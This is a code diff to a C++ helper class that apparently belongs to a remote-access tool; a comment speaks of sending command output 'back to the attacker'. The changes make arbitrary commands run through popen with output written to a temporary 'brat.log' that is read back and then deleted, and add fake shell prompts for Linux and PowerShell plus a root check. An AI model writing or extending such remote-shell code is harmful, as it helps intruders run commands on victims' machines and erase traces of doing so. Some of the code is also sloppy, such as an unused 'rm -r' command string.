@@ -2,6 +2,7 @@
 #include <iostream>
 #include <string.h>
 #include <algorithm>
+#include <fstream>
 
 #define BUFFER_LENGTH 4096
 
@@ -11,6 +12,8 @@
 
 // Some important macros that really needed to be defined in linux idk im newb ;-;
 #ifdef __linux__
+#include <unistd.h>
+
 #define SOCKET int // This is used so that we don't have to change the return type of getSocket() xDDDD
 #define _popen popen
 #define _pclose pclose
@@ -22,13 +25,31 @@
 #define timeSleep 10
 #endif
 
+// A Static class
 class Helpers {
+	Helpers(){} // Preventing the creation of an object.
 public:
 	static void divider(int size = 50) {
 		for (int i = 0; i < size; i++) {
 			std::cout << "=";
 		}
 		std::cout << std::endl;
+	}
+	static std::string readFromFile(const std::string& file_name){
+		std::string cmd = "rm -r " + file_name;
+		std::string temp;
+		std::string ret;
+		std::ifstream fHandle(file_name.c_str());
+		if(!fHandle.good())
+			return "";
+		if(!fHandle){
+			std::cout << "Unable to read from file!\n";
+			return "";
+		}
+		while(std::getline(fHandle, temp)){
+			ret += temp + "\n";
+		}
+		return ret;
 	}
 	static std::string getDivider(int size = 50) {
 		std::string divider;
@@ -38,27 +59,47 @@ public:
 		return divider;
 	}
 	static std::string executeCommand(const char command[]) {
+		/*
+			I implemented a method to firstly call the subprocess and simply send the output back
+			to the attacker. But it was messing up as the stderrs were causing issues.
+		*/
 		FILE* fp = NULL;
 		int status;
 		const int PATH_MAX = 4096;
 		char path[PATH_MAX] = { 0 };
 		std::string out; // This will contain the value to be returned.
 
+		std::string temp;
+		const char* rmCMD = "rm ";
+		std::string logName = "brat.log";
+		std::string remove = rmCMD;
+
+		#ifdef _WIN32
+		temp = "%temp%\\";
+		#endif
+		#ifdef __linux__
+		temp = "/tmp/";
+		#endif
+		logName.insert(0, temp);
+		remove += logName;
+		std::string cmd = command;
+		cmd.insert(0, "(");
+		cmd += ") 1> " + logName + " 2>&1";
+		command = cmd.c_str();
 		fp = _popen(command, "r");
 		if (fp == NULL) {
 			std::cout << "Unable to execute command!\n";
 			return "";
 		}
-
-		while (fgets(path, PATH_MAX, fp) != NULL)
-			out += path;
-
+		while (fgets(path, PATH_MAX, fp) != NULL){}
+		out = readFromFile(logName);
 		if (fp == NULL)
 			return "";
 		status = _pclose(fp);
 		if (status == -1) {
 			std::cout << "Unable to close\n";
 		}
+		system(remove.c_str());
 		return out;
 	}
 	static void removeDisallowed(std::string& in) {
@@ -111,15 +152,23 @@ public:
 		std::string shell = "";
 #ifdef __linux__
 		shell = "┌──[";
-		shell += executeCommand("whoami");
+		std::string whoami = removeNewline(executeCommand("whoami").c_str());
+		shell += whoami;
 		shell += "@" + executeCommand("hostname") + "]─[";
 		shell += executeCommand("pwd") + "]";
-		shell = removeNewline(shell.c_str()) + "\n└──╼ $ ";
+		shell = removeNewline(shell.c_str()) + "\n└──╼ " + (whoami == "root" ? "# " : "$ ");
 #endif
 #ifdef _WIN32
-		shell = "[" + removeNewline(executeCommand("echo %username%").c_str()) + "]=[" + removeNewline(executeCommand("cd").c_str()) + "] > ";
+		shell = "[" + removeNewline(executeCommand("echo %username%").c_str()) + "]=[" + removeNewline(executeCommand("cd").c_str()) + "]--> ";
 #endif
 		return shell;
+	}
+	static std::string getPowerShellPrompt(){
+		#ifdef _WIN32
+		std::string shell = "PS " + removeNewline(executeCommand("cd").c_str()) + " > ";
+		return shell;
+		#endif
+		return "";
 	}
 	static std::string removeNewline(const char* ar) {
 		size_t len = strlen(ar);
@@ -130,5 +179,8 @@ public:
 			arr[i] = ar[i];
 		arr[std::remove_if(arr, arr + len, [](char c) { return c == '\n'; }) - arr] = 0;
 		return arr;
+	}
+	static bool isRoot(){
+		return geteuid() == 0;
 	}
 };
